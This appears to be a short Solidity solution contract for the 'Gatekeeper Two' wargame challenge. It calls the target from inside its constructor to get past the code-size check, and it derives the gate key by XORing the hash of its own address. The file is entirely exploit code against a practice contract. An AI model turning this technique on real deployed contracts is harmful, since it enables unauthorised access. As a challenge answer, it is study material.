// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo gatekeeperTwoContract;

    constructor(address _gatekeeperTwoContract) public {
        gatekeeperTwoContract = GatekeeperTwo(_gatekeeperTwoContract);

        uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(this))));

        bytes8 _gatekey = bytes8(hash ^ type(uint64).max);

        gatekeeperTwoContract.enter(_gatekey);
    }
}
